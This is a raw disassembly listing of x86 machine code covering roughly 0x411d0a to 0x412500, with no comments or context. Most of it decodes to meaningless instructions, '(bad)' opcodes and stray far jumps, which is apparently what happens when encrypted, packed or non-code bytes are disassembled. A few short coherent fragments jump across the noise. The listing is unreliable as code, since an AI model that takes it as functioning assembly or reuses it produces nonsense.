  411d0a:	mov    esi,DWORD PTR [ebx]
  411d0c:	adc    BYTE PTR [edx+0x5c],bl
  411d0f:	call   0x673b:0x9f510292
  411d16:	aam    0x85
  411d18:	stos   DWORD PTR es:[edi],eax
  411d19:	cmp    DWORD PTR [eax+0x72],ebp
  411d1c:	pop    edi
  411d1d:	retf   0x865c
  411d20:	push   ds
  411d21:	loop   0x411cc7
  411d23:	push   0xfffffff6
  411d25:	mov    bl,0x86
  411d27:	cmp    edx,ecx
  411d29:	mov    ecx,0x24e60d45
  411d2e:	xchg   DWORD PTR [eax+0x3cb9fc07],ecx
  411d34:	rcr    bh,cl
  411d36:	les    ecx,FWORD PTR [edx-0x53]
  411d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d3a:	pop    esi
  411d3b:	arpl   WORD PTR ds:0xf94986fb,ax
  411d41:	xchg   ebx,eax
  411d42:	xchg   DWORD PTR [edx+0x3f],esp
  411d45:	push   edi
  411d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d47:	push   esp
  411d48:	lahf   
  411d49:	retf   
  411d4a:	popa   
  411d4b:	add    DWORD PTR [ebx-0xb760e28],ebp
  411d51:	jo     0x411d90
  411d53:	jno    0x411d0e
  411d55:	mov    al,0xc8
  411d57:	(bad)  
  411d58:	sbb    BYTE PTR [ecx+0xaf586b2],bh
  411d5e:	stos   DWORD PTR es:[edi],eax
  411d5f:	enter  0x66f7,0x10
  411d63:	in     eax,0x2e
  411d65:	idiv   DWORD PTR [ebx+ebx*1]
  411d68:	sbb    BYTE PTR [ebp+0x25],ch
  411d6b:	xlat   BYTE PTR ds:[ebx]
  411d6c:	pop    ecx
  411d6d:	cmp    eax,0x42f1e123
  411d72:	mov    al,0xb1
  411d74:	mov    eax,0x1aad0262
  411d79:	cmp    cl,dh
  411d7b:	fidiv  DWORD PTR [edx+ecx*4-0x77347969]
  411d82:	outs   dx,DWORD PTR ds:[esi]
  411d83:	cmp    BYTE PTR [ebx-0x2],cl
  411d86:	dec    ecx
  411d87:	test   eax,0x32da7818
  411d8c:	fimul  WORD PTR [eax+eax*8-0x71]
  411d90:	push   ss
  411d91:	aad    0x92
  411d93:	pop    edi
  411d94:	ds test al,0x84
  411d97:	pushw  es
  411d99:	push   ebp
  411d9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d9c:	cmp    BYTE PTR [eax+0x720c279e],0xce
  411da3:	mov    gs,ecx
  411da5:	mov    BYTE PTR [ebp-0x5e0ad84d],dh
  411dab:	adc    eax,0xca11324f
  411db0:	mov    al,ds:0x106c5e39
  411db5:	xchg   ebp,eax
  411db6:	inc    eax
  411db7:	loope  0x411dcd
  411db9:	xlat   BYTE PTR ds:[ebx]
  411dba:	add    eax,0xe62de1bd
  411dbf:	test   ah,0xca
  411dc2:	fimul  DWORD PTR [ebx-0x5ab570c8]
  411dc8:	cmp    BYTE PTR [edx],0xf3
  411dcb:	mov    ds:0x4cb9ad47,al
  411dd0:	in     eax,0xa0
  411dd2:	aad    0x42
  411dd4:	(bad)  
  411dd5:	scas   eax,DWORD PTR es:[edi]
  411dd6:	and    cl,BYTE PTR [ebp+0x3e]
  411dd9:	xchg   edi,eax
  411dda:	lds    ebx,FWORD PTR [eax-0x67]
  411ddd:	adc    al,0x14
  411ddf:	sbb    ebp,DWORD PTR [edx]
  411de1:	fst    DWORD PTR [esi+0x60ec623f]
  411de7:	inc    edx
  411de8:	lods   eax,DWORD PTR ds:[esi]
  411de9:	or     DWORD PTR [edi+edx*2],edi
  411dec:	mov    ds:0x78fe0ae6,eax
  411df1:	pop    edx
  411df2:	or     bl,BYTE PTR [esi]
  411df4:	pop    ds
  411df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411df6:	enter  0xd52b,0x92
  411dfa:	mov    ds:0x4bdbfc5d,eax
  411dff:	push   eax
  411e00:	scas   eax,DWORD PTR es:[edi]
  411e01:	adc    eax,0x92b5f9bf
  411e06:	adc    ebp,edi
  411e08:	rcl    BYTE PTR [edi-0x50b5e2ca],cl
  411e0e:	cwde   
  411e0f:	xor    ebp,DWORD PTR ds:0xed55812f
  411e15:	mov    cl,BYTE PTR [esi+0x3b91f428]
  411e1b:	ret    
  411e1c:	aaa    
  411e1d:	jmp    0xff34:0x74788050
  411e24:	cmp    eax,0x5c0abb10
  411e29:	out    0xe6,al
  411e2b:	sub    esp,esi
  411e2d:	xor    eax,0xb6b2fde4
  411e32:	enter  0xd176,0xbc
  411e36:	inc    eax
  411e37:	aaa    
  411e38:	inc    esi
  411e39:	jb     0x411e76
  411e3b:	jb     0x411dd5
  411e3d:	xchg   edi,eax
  411e3e:	pop    esp
  411e3f:	cmp    al,0x21
  411e41:	xchg   DWORD PTR gs:[ebx+0x772156c7],esp
  411e48:	xor    al,0x63
  411e4a:	js     0x411eb2
  411e4c:	mov    DWORD PTR [ecx],ebx
  411e4e:	sub    ecx,DWORD PTR [ebx-0x79]
  411e51:	loopne 0x411e1a
  411e53:	and    al,0xd1
  411e55:	push   0xffffffab
  411e57:	mov    ah,0x7d
  411e59:	cmp    ecx,eax
  411e5b:	addr16 pop ebx
  411e5d:	outs   dx,DWORD PTR ds:[esi]
  411e5e:	dec    ebp
  411e5f:	out    0x8b,al
  411e61:	push   ecx
  411e62:	addr16 dec esi
  411e64:	imul   ebp,eax,0xa6684da7
  411e6a:	out    dx,al
  411e6b:	jae    0x411e17
  411e6d:	clc    
  411e6e:	pop    eax
  411e6f:	lea    ebp,[esi-0x4c3d9a0d]
  411e75:	add    edx,esp
  411e77:	xor    BYTE PTR [esi],0xb
  411e7a:	mov    al,ds:0xd354cce2
  411e7f:	mov    ds:0xf85ea715,al
  411e84:	adc    ch,BYTE PTR [edx]
  411e86:	scas   eax,DWORD PTR es:[edi]
  411e87:	retf   0xd631
  411e8a:	jecxz  0x411f01
  411e8c:	xchg   edi,eax
  411e8d:	mov    edx,0x7792ee33
  411e92:	aaa    
  411e93:	add    al,0x2d
  411e96:	jg     0x411eb5
  411e98:	in     al,dx
  411e99:	dec    ecx
  411e9a:	sub    DWORD PTR [edi+0x7b],ebx
  411e9d:	mov    BYTE PTR [eax],al
  411e9f:	or     BYTE PTR [edi+0x167cd58b],dh
  411ea5:	popf   
  411ea6:	data16 jbe 0x411e6a
  411ea9:	bnd repz jns 0x411ee3
  411ead:	push   0x6a
  411eaf:	xor    eax,0x478d0ece
  411eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb5:	int3   
  411eb6:	mov    ecx,0x14b4b87a
  411ebb:	mov    WORD PTR es:[edx-0x720d3c23],?
  411ec2:	pop    ebp
  411ec3:	cdq    
  411ec4:	hlt    
  411ec5:	fsubr  DWORD PTR [ebx+edi*4+0x491a2e71]
  411ecc:	push   esp
  411ecd:	cmp    al,BYTE PTR [ecx-0x6d]
  411ed0:	inc    esp
  411ed1:	jnp    0x411eef
  411ed3:	jo     0x411f29
  411ed5:	and    al,0x84
  411ed7:	inc    esi
  411ed8:	in     al,0xce
  411eda:	add    ebx,DWORD PTR [edi-0x6f]
  411edd:	fmul   st(4),st
  411edf:	ins    BYTE PTR es:[edi],dx
  411ee0:	aaa    
  411ee1:	test   BYTE PTR [ebx-0x6c],bl
  411ee4:	sbb    BYTE PTR [ecx-0x6],dl
  411ee7:	jns    0x411e8b
  411ee9:	fdiv   st,st(2)
  411eeb:	adc    ebp,DWORD PTR [ebp-0x1eb9c330]
  411ef1:	add    eax,0xc1a93a41
  411ef6:	push   0xe8ed3741
  411efb:	imul   esi,DWORD PTR [edi],0xbca4d2b3
  411f01:	push   ss
  411f02:	pop    ds
  411f03:	rol    dl,1
  411f05:	mov    al,0xbd
  411f07:	lds    esp,FWORD PTR [edx]
  411f09:	(bad)  
  411f0b:	adc    eax,0xd24d8ce2
  411f10:	rcl    ch,1
  411f12:	add    esi,esi
  411f14:	adc    bl,BYTE PTR [eax]
  411f16:	test   al,0xe4
  411f18:	jne    0x411eb8
  411f1a:	jmp    0x411f1d
  411f1c:	pop    ebp
  411f1d:	scas   al,BYTE PTR es:[edi]
  411f1e:	inc    esi
  411f1f:	add    al,0xe3
  411f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f22:	adc    eax,0x46beffde
  411f27:	jno    0x411f75
  411f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f2a:	sbb    ch,BYTE PTR [esp+ecx*2+0x68fbf4a2]
  411f31:	retf   0x1b9b
  411f34:	pop    edx
  411f35:	inc    ecx
  411f36:	push   ss
  411f37:	mov    ebx,0x5bc88a7c
  411f3c:	cli    
  411f3d:	mov    ds:0xdb510852,eax
  411f42:	dec    eax
  411f43:	pop    es
  411f44:	push   edx
  411f45:	xchg   edx,eax
  411f46:	test   eax,0x4076a493
  411f4b:	mov    bl,0xca
  411f4d:	int3   
  411f4e:	lds    ebp,FWORD PTR [eax+0x31]
  411f51:	xor    al,0xcd
  411f53:	mov    ds:0x23eedeeb,eax
  411f58:	shr    DWORD PTR [eax-0x67],1
  411f5b:	pop    esi
  411f5c:	and    eax,0x2cb4f877
  411f61:	clc    
  411f62:	or     edx,edx
  411f64:	fld    QWORD PTR [eax+0xd]
  411f67:	lahf   
  411f68:	addr16 ret 
  411f6a:	fimul  DWORD PTR [edi]
  411f6c:	in     eax,dx
  411f6d:	dec    esp
  411f6e:	cmp    BYTE PTR [edi+edi*4+0x558b651c],0xc4
  411f76:	mov    edi,DWORD PTR [ebp-0x4]
  411f79:	xor    edi,eax
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	clc    
  411f8f:	xchg   esi,eax
  411f90:	dec    edx
  411f91:	icebp  
  411f92:	jmp    0x411fff
  411f94:	js     0x41200e
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	add    BYTE PTR [esi+ebp*4+0x35cb179f],ch
  411fa1:	sbb    ebp,edi
  411fa3:	pop    ecx
  411fa4:	adc    ah,BYTE PTR [ecx-0x1e]
  411fa7:	mov    BYTE PTR [edx+0x3],ch
  411faa:	test   BYTE PTR [ecx+0x40],ah
  411fad:	mov    ebx,esi
  411faf:	(bad)  
  411fb0:	fistp  WORD PTR es:[ebp+0x1bc58c44]
  411fb7:	cs push ds
  411fb9:	xchg   esi,eax
  411fba:	pop    ds
  411fbb:	les    edi,FWORD PTR [edx-0x22d93aa6]
  411fc1:	not    BYTE PTR [edx]
  411fc3:	inc    esi
  411fc4:	lock mov dh,0x15
  411fc7:	jb     0x412044
  411fc9:	(bad)  
  411fca:	call   0xdfa57af6
  411fcf:	gs inc esi
  411fd1:	leave  
  411fd2:	mov    eax,ds:0xb813b4b8
  411fd7:	add    eax,0x2f624939
  411fdc:	ret    
  411fdd:	mov    ebx,DWORD PTR [ebx+0x5a]
  411fe0:	jg     0x412014
  411fe2:	xchg   DWORD PTR [esi-0x1e],ebp
  411fe5:	mov    ds:0x143472c,al
  411fea:	cs data16 scas al,BYTE PTR es:[edi]
  411fed:	pop    edi
  411fee:	dec    edi
  411fef:	fs cmp al,0xac
  411ff2:	fimul  WORD PTR [ebx+0x36]
  411ff5:	cdq    
  411ff6:	retf   
  411ff7:	jno    0x412057
  411ff9:	mov    eax,0x1b4ec8b4
  411ffe:	pop    edx
  411fff:	out    0x30,eax
  412001:	mov    cl,0xed
  412003:	sbb    bl,BYTE PTR [ecx+0x29]
  412006:	sub    BYTE PTR [ebp+eax*1-0x68],0xcc
  41200b:	mov    al,0x8b
  41200d:	aam    0x40
  41200f:	in     eax,0x4c
  412011:	inc    edx
  412012:	inc    ebp
  412013:	cmp    esi,DWORD PTR [esi-0xf182c53]
  412019:	fldcw  WORD PTR [ebp-0x62b8dc49]
  41201f:	inc    ecx
  412020:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412022:	aaa    
  412023:	sbb    eax,0xf85c8005
  412028:	and    DWORD PTR [edi+0x5d],ecx
  41202b:	mov    ?,edx
  41202d:	inc    esi
  41202e:	xor    eax,0x6300050f
  412033:	scas   eax,DWORD PTR es:[edi]
  412034:	out    0x99,eax
  412036:	jle    0x411fd9
  412038:	jno    0x41206e
  41203a:	fsubr  QWORD PTR [ebx+0x48024419]
  412040:	dec    ebp
  412041:	xchg   esp,eax
  412042:	xlat   BYTE PTR ds:[ebx]
  412043:	lea    esi,[ecx+0x70]
  412046:	out    0x0,eax
  412048:	push   ebp
  412049:	jb     0x412074
  41204b:	sbb    ecx,DWORD PTR [ecx]
  41204d:	adc    eax,0x94ff0cf1
  412052:	gs es out 0xcb,al
  412056:	repz es dec esp
  412059:	js     0x412008
  41205b:	mov    eax,0x45439543
  412060:	push   0xfffffff5
  412062:	addr16 xchg ebp,ecx
  412065:	push   0xffffffca
  412067:	sub    cl,dh
  412069:	call   0x57700372
  41206e:	arpl   WORD PTR [esi+0x9],bx
  412071:	mov    ebp,0x234efbd7
  412076:	dec    ebx
  412077:	fdivr  DWORD PTR cs:[ecx]
  41207a:	push   ds
  41207b:	pop    esp
  41207c:	test   eax,0x8d19dd3c
  412081:	mov    ebp,0xd4031d59
  412086:	call   0xfba1:0xec608a7d
  41208d:	arpl   WORD PTR [ebp+0x42f9040f],bp
  412093:	inc    edi
  412094:	adc    ebp,eax
  412096:	retf   0xdad1
  412099:	ds jge 0x4120e8
  41209c:	in     eax,0xbf
  41209e:	jns    0x4120d5
  4120a0:	push   ebp
  4120a1:	xor    BYTE PTR ds:[edx-0x2c],bh
  4120a5:	inc    edx
  4120a6:	out    dx,eax
  4120a7:	test   BYTE PTR [edx+0x3e],bl
  4120aa:	inc    esi
  4120ab:	call   0x5d6c05e5
  4120b0:	les    edi,FWORD PTR [ecx]
  4120b2:	dec    esp
  4120b3:	imul   BYTE PTR [edi-0x26ea6cfa]
  4120b9:	(bad)  
  4120ba:	cmc    
  4120bb:	xchg   esp,eax
  4120bc:	jo     0x4120cb
  4120be:	call   0x6a1de0f0
  4120c3:	xchg   esi,eax
  4120c4:	out    dx,al
  4120c5:	les    ebx,FWORD PTR [eax+0xbb82177]
  4120cb:	repnz cwd 
  4120ce:	xchg   edx,eax
  4120cf:	ins    DWORD PTR es:[edi],dx
  4120d0:	das    
  4120d1:	push   ebx
  4120d2:	adc    BYTE PTR [esi-0x67],bl
  4120d5:	ret    0xe7c1
  4120d8:	js     0x412135
  4120da:	push   ecx
  4120db:	cmp    DWORD PTR [eax+0x13],ebx
  4120de:	int    0x84
  4120e0:	inc    ebp
  4120e1:	xor    al,0x2d
  4120e3:	pop    es
  4120e4:	sbb    BYTE PTR [edx+0x2d],dl
  4120e7:	test   DWORD PTR [edi-0x77b6e7a],ecx
  4120ed:	imul   ecx,DWORD PTR [edx+ebx*1-0x1ce07548],0xffffffed
  4120f5:	ror    bh,0x34
  4120f8:	or     eax,0x6325dc91
  4120fd:	js     0xf26946e8
  412103:	aad    0xd1
  412105:	clc    
  412106:	test   al,0x31
  412108:	ins    BYTE PTR es:[edi],dx
  412109:	retf   
  41210a:	jge    0x41212c
  41210c:	rol    DWORD PTR [esi-0x44],0x44
  412110:	test   BYTE PTR [edi+ebx*1+0x49],dh
  412114:	inc    esp
  412115:	mov    ebx,0x51fabd92
  41211a:	pop    ss
  41211b:	and    DWORD PTR [ecx],ecx
  41211d:	mov    ebx,0x7d54d62e
  412122:	xor    BYTE PTR [ebx+0x683cbb94],ah
  412128:	lods   al,BYTE PTR ds:[esi]
  412129:	push   cs
  41212a:	cld    
  41212b:	dec    edi
  41212c:	je     0x4120af
  41212e:	sub    DWORD PTR [edi],edi
  412130:	adc    ah,BYTE PTR [ebx]
  412132:	clc    
  412133:	push   DWORD PTR [edi+0x4b]
  412136:	shl    DWORD PTR [esi+0x7a],1
  412139:	mov    cl,0x2
  41213b:	push   edi
  41213c:	retf   0x44be
  41213f:	mov    esi,0x31e15aea
  412144:	imul   ebp,DWORD PTR [ebx],0x47
  412147:	test   BYTE PTR [edx+0x69],bh
  41214a:	mov    ecx,0xcabdbd37
  41214f:	xchg   esi,eax
  412150:	pop    edi
  412151:	jbe    0x4121c3
  412153:	adc    eax,0x6f94caf1
  412158:	dec    ebp
  412159:	fimul  WORD PTR [edx]
  41215b:	(bad)  
  41215c:	pop    ss
  41215d:	cmp    eax,0x7774adfa
  412162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412163:	retf   0xdde3
  412166:	retf   
  412167:	dec    esp
  412168:	cld    
  412169:	(bad)  
  41216a:	call   0x7d2fbaf1
  41216f:	loop   0x412164
  412171:	pop    ebx
  412172:	xchg   ebp,eax
  412173:	cmp    eax,0xfc259820
  412178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412179:	lds    ebp,FWORD PTR [esi+ecx*2+0x7404ab5a]
  412180:	int    0x34
  412182:	rol    BYTE PTR [eax],0xb4
  412185:	jo     0x412108
  412187:	jge    0x4121a2
  412189:	push   ecx
  41218a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41218b:	jl     0x412129
  41218d:	lea    edi,[edi+0x2a]
  412190:	shl    ecx,1
  412192:	cwde   
  412193:	bound  ecx,QWORD PTR [esi+ecx*2]
  412196:	jmp    0xd5aa:0x2d888be8
  41219d:	inc    ebx
  41219e:	dec    esp
  41219f:	push   eax
  4121a0:	mov    bl,0x9c
  4121a2:	rcr    BYTE PTR [eax-0x6a],1
  4121a5:	and    al,BYTE PTR [ecx+0x12]
  4121a8:	imul   eax,DWORD PTR [ebp+0x30efaaff],0x56
  4121af:	jle    0x412204
  4121b1:	dec    cl
  4121b3:	jl     0x412229
  4121b5:	sbb    cl,bl
  4121b7:	jnp    0x4121eb
  4121b9:	sub    eax,0x996859f3
  4121be:	xchg   esi,eax
  4121bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c0:	fcomp  QWORD PTR [ebp-0x1c]
  4121c3:	jmp    0x342f:0x6caaf9f2
  4121ca:	add    eax,0x86041941
  4121cf:	js     0x412191
  4121d1:	sbb    BYTE PTR [edx-0x62],ah
  4121d4:	dec    ecx
  4121d5:	push   esp
  4121d6:	and    eax,0x34
  4121d9:	test   BYTE PTR [eax],al
  4121db:	push   cs
  4121dc:	sbb    al,0x84
  4121de:	mov    DWORD PTR [edx-0x734d1969],esi
  4121e4:	mov    DWORD PTR [ebp-0x5a],ebx
  4121e7:	mov    ds:0xbbcd7f16,al
  4121ec:	mov    ds:0x95f789bd,eax
  4121f1:	aam    0xa6
  4121f3:	out    dx,al
  4121f4:	(bad)  
  4121f5:	arpl   WORD PTR [edi+0x4d],ax
  4121f8:	mov    ds:0xad45d29d,eax
  4121fd:	inc    edi
  4121fe:	iret   
  4121ff:	cmp    edx,DWORD PTR [ebx+0x26]
  412202:	arpl   WORD PTR [edi+ebp*2-0x2efc06fd],bp
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	rol    DWORD PTR [edi+0x77],cl
  412236:	cmp    al,0x50
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	sub    DWORD PTR [ecx+0x6e],0x3bd1deb3
  412246:	xchg   edx,eax
  412247:	jle    0x412246
  412249:	lds    eax,FWORD PTR ds:0xb6aae915
  41224f:	cmp    BYTE PTR ds:0x9c0d63e1,dh
  412255:	mov    cl,0x6e
  412257:	out    dx,al
  412258:	jmp    0xb18e0f9d
  41225d:	mov    ecx,esi
  41225f:	es rol DWORD PTR ds:[edx],0xd4
  412264:	inc    edx
  412265:	push   ebx
  412266:	lahf   
  412267:	iret   
  412268:	mov    BYTE PTR [esi+ebx*8],bh
  41226b:	les    edx,FWORD PTR [eax+eax*2+0x1f92c421]
  412272:	pop    ds
  412273:	sar    BYTE PTR [ecx+0x11ed02e0],0x59
  41227a:	push   cs
  41227b:	push   es
  41227c:	pop    esp
  41227d:	pop    esi
  41227e:	data16 mov cl,0xe9
  412281:	stos   BYTE PTR es:[edi],al
  412282:	push   ss
  412283:	(bad)  
  412285:	cwde   
  412286:	lock mov dl,0x65
  412289:	rol    BYTE PTR [esp+ebx*1-0x6612dd37],0xc9
  412291:	in     al,dx
  412292:	pusha  
  412293:	mov    BYTE PTR [edx+0x2c554545],al
  412299:	sti    
  41229a:	mov    dh,ah
  41229c:	ret    0x948e
  41229f:	add    dl,dl
  4122a1:	inc    edi
  4122a2:	sub    BYTE PTR [edx+0x2e],ah
  4122a5:	rcl    DWORD PTR [ecx-0x79],1
  4122a8:	sub    eax,0xa648f90f
  4122ad:	xor    dl,BYTE PTR ds:0x56b3fcbf
  4122b3:	cld    
  4122b4:	mov    bh,BYTE PTR [eax]
  4122b6:	or     BYTE PTR [esi+0x3e15a626],bl
  4122bc:	aad    0x57
  4122be:	inc    edi
  4122bf:	(bad)  
  4122c0:	(bad)  
  4122c1:	jle    0x4122bb
  4122c3:	jbe    0x4122ef
  4122c5:	xchg   esp,ecx
  4122c7:	popa   
  4122c8:	fisub  WORD PTR [ecx+0xd]
  4122cb:	add    BYTE PTR [ebx+ebp*1-0x3d2ea29d],al
  4122d2:	cmp    ebp,DWORD PTR [eax]
  4122d4:	lods   eax,DWORD PTR ds:[esi]
  4122d5:	es sbb eax,0xdf232742
  4122db:	jbe    0x412315
  4122dd:	cmp    al,0xcc
  4122df:	add    BYTE PTR [ebp-0x257e10b2],cl
  4122e5:	mov    edx,0x66e5282e
  4122ea:	and    edx,edx
  4122ec:	jp     0x41228a
  4122ee:	mov    al,ds:0xd5a9f8d8
  4122f3:	adc    bl,BYTE PTR [eax]
  4122f5:	adc    al,0xd7
  4122f7:	(bad)  
  4122f8:	sahf   
  4122f9:	pop    esp
  4122fa:	ja     0x4122aa
  4122fc:	addr16 jmp 0x4a6c:0xd0163839
  412304:	repnz out 0xb5,eax
  412307:	dec    ebx
  412308:	or     ebp,DWORD PTR [ebx-0x9]
  41230b:	sub    eax,0x6c773699
  412310:	loop   0x41238b
  412312:	iret   
  412313:	pop    ebp
  412314:	cmp    al,0xc5
  412316:	imul   eax,edx,0x29f0bdc7
  41231c:	bound  eax,QWORD PTR [esi]
  41231e:	xor    bl,BYTE PTR [ecx-0x76a8f5ab]
  412324:	loope  0x412338
  412326:	and    esi,DWORD PTR [ebx]
  412328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412329:	int3   
  41232a:	sbb    eax,DWORD PTR [esi+0x668941d5]
  412330:	scas   al,BYTE PTR es:[edi]
  412331:	jmp    0xbb28:0x2886b4bd
  412338:	addr16 mov esi,0xb77fafea
  41233e:	pushf  
  41233f:	sahf   
  412340:	(bad)  
  412341:	cwde   
  412342:	dec    edi
  412343:	test   al,0x17
  412345:	fwait
  412346:	adc    al,0x65
  412348:	fimul  DWORD PTR [esi+ecx*1]
  41234b:	xor    al,0x25
  41234d:	outs   dx,BYTE PTR ds:[esi]
  41234e:	ja     0x4122d0
  412350:	mov    edi,DWORD PTR [edx-0x679eae51]
  412356:	sbb    BYTE PTR [ebx+ebx*4],dh
  412359:	push   eax
  41235a:	add    DWORD PTR es:[ecx-0x1ee196e9],esi
  412361:	cli    
  412362:	jno    0x4122ea
  412364:	sti    
  412365:	or     esi,DWORD PTR [eax]
  412367:	js     0x41231a
  412369:	mov    eax,ds:0x6a4b97cb
  41236e:	test   al,0x18
  412370:	je     0x4122f9
  412372:	push   esp
  412373:	sahf   
  412374:	fxch   st(4)
  412376:	add    BYTE PTR [ebp+ebx*8+0x4a26ca91],bh
  41237d:	mov    cl,0xc
  41237f:	add    BYTE PTR [ebx+0x75d02678],ah
  412385:	jg     0x4123db
  412387:	es iret 
  412389:	pop    edx
  41238a:	sar    BYTE PTR gs:[esi],0x19
  41238e:	loopne 0x41238d
  412390:	xor    BYTE PTR ds:0xf861b80a,cl
  412396:	retf   0xe81c
  412399:	scas   al,BYTE PTR es:[edi]
  41239a:	mov    ebp,0x8d1083e
  41239f:	mov    edx,DWORD PTR [ebx]
  4123a1:	jg     0x412390
  4123a3:	idiv   DWORD PTR [edi-0x2fa52d8c]
  4123a9:	dec    di
  4123ab:	repz jnp 0x41237a
  4123ae:	add    DWORD PTR [eax+0x7b],ecx
  4123b1:	mov    eax,ds:0xc23d6ab0
  4123b6:	add    al,0x32
  4123b8:	mov    ch,BYTE PTR [ebx+ebp*4]
  4123bb:	add    DWORD PTR [esi],eax
  4123bd:	push   eax
  4123be:	repnz mov ecx,cs
  4123c1:	lds    ecx,FWORD PTR [edx]
  4123c3:	idiv   DWORD PTR [esp+edx*1-0x1038c7b8]
  4123ca:	pop    edx
  4123cb:	pop    edx
  4123cc:	mov    ebx,0xc6b33c94
  4123d1:	out    dx,eax
  4123d2:	repz test al,0x9b
  4123d5:	push   eax
  4123d6:	inc    eax
  4123d7:	sbb    dh,BYTE PTR [esi-0x1e]
  4123da:	jno    0x41243c
  4123dc:	dec    esi
  4123dd:	or     ah,ch
  4123df:	outs   dx,DWORD PTR ds:[esi]
  4123e0:	xchg   edi,eax
  4123e1:	push   cs
  4123e2:	mov    al,ds:0x7017b44e
  4123e7:	pop    DWORD PTR [ecx+0x62]
  4123ea:	adc    ecx,esi
  4123ec:	mov    dl,dh
  4123ee:	retf   
  4123ef:	push   esp
  4123f0:	inc    eax
  4123f1:	out    dx,al
  4123f2:	jge    0x412420
  4123f4:	repz out dx,eax
  4123f6:	pop    ss
  4123f7:	imul   edi,DWORD PTR [ebx-0x3c],0x521550bd
  4123fe:	or     esp,DWORD PTR [esi-0x8]
  412401:	xor    edx,0xf895033b
  412407:	ret    0xef2
  41240a:	loope  0x412391
  41240c:	mov    ds:0x86c782cc,al
  412411:	sbb    eax,0x6ae4d016
  412416:	and    BYTE PTR [edx],0x89
  412419:	enter  0xf578,0xd9
  41241d:	in     eax,dx
  41241e:	dec    ecx
  41241f:	and    esi,DWORD PTR [ebp+0x2b]
  412422:	gs jmp 0x4124a3
  412425:	inc    edi
  412426:	pop    edi
  412427:	(bad)  
  41242b:	into   
  41242c:	ror    dl,1
  41242e:	add    al,0x2a
  412430:	fs pop esi
  412432:	jp     0x412406
  412434:	and    eax,0x8b4539bb
  412439:	in     al,dx
  41243a:	and    bh,BYTE PTR [ebx]
  41243c:	mov    eax,0xc0588479
  412441:	push   esi
  412442:	mov    ah,ch
  412444:	outs   dx,BYTE PTR ds:[esi]
  412445:	push   esp
  412446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412447:	sbb    ebx,DWORD PTR [ebx-0x602d825c]
  41244d:	aas    
  41244e:	fisubr DWORD PTR [edi-0x11]
  412451:	or     al,0x64
  412453:	cmp    DWORD PTR [edi+ebx*4],ecx
  412456:	jb     0x4123e8
  412458:	pop    ss
  412459:	adc    DWORD PTR ds:0xc2e33fd2,0xccff93af
  412463:	mov    ebx,0x2a7fe138
  412468:	lock repz retf 
  41246b:	xchg   edx,eax
  41246c:	xchg   esp,eax
  41246d:	int    0xdb
  41246f:	outs   dx,BYTE PTR ds:[esi]
  412470:	fdiv   st(2),st
  412472:	repz dec eax
  412474:	adc    BYTE PTR [ebx-0x31],ch
  412477:	mov    ebp,0x2194e8f7
  41247c:	xor    al,0x5c
  41247e:	sbb    al,0x97
  412480:	stos   DWORD PTR es:[edi],eax
  412481:	into   
  412482:	and    DWORD PTR [esi+ebx*1+0x5bba893e],ebp
  412489:	pop    ss
  41248a:	cld    
  41248b:	sub    ecx,ecx
  41248d:	mov    bh,0xb7
  41248f:	xlat   BYTE PTR ds:[ebx]
  412490:	sbb    esp,DWORD PTR [eax-0x5922443f]
  412496:	or     dl,al
  412498:	mov    ds:0xd6db509a,al
  41249d:	xor    eax,0x50bf95de
  4124a2:	loopne 0x4124c7
  4124a4:	ret    
  4124a5:	mov    ds:0xa94bbbd3,eax
  4124aa:	mov    DWORD PTR [ebp-0x1c],edx
  4124ad:	jmp    0x412735
  4124b2:	iret   
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0xcf1ebe60
  4124bf:	adc    BYTE PTR [eax],dh
  4124c1:	and    DWORD PTR ds:0xe578786e,edi
  4124c7:	jle    0x412541
  4124c9:	js     0x412529
  4124cb:	mov    cl,0xb6
  4124cd:	xchg   BYTE PTR [ecx-0x2f],cl
  4124d0:	fistp  QWORD PTR [eax]
  4124d2:	sbb    ah,BYTE PTR ds:0xad9af3e5
  4124d8:	call   DWORD PTR [ecx-0x5f]
  4124db:	sbb    eax,ebp
  4124dd:	xor    al,0xf8
  4124df:	fs jae 0x4124ac
  4124e2:	or     eax,ebx
  4124e4:	clc    
  4124e5:	sar    BYTE PTR [edi-0x49],cl
  4124e8:	jl     0x4124c3
  4124ea:	sub    eax,0x85df95ff
  4124ef:	iret   
  4124f0:	retf   0x3bf5
  4124f3:	pop    ebx
  4124f4:	mov    al,ds:0x9d5d06b5
  4124f9:	in     eax,0x7
  4124fb:	test   eax,0xc0845812
  412500:	adc    DWORD PTR [ecx],eax
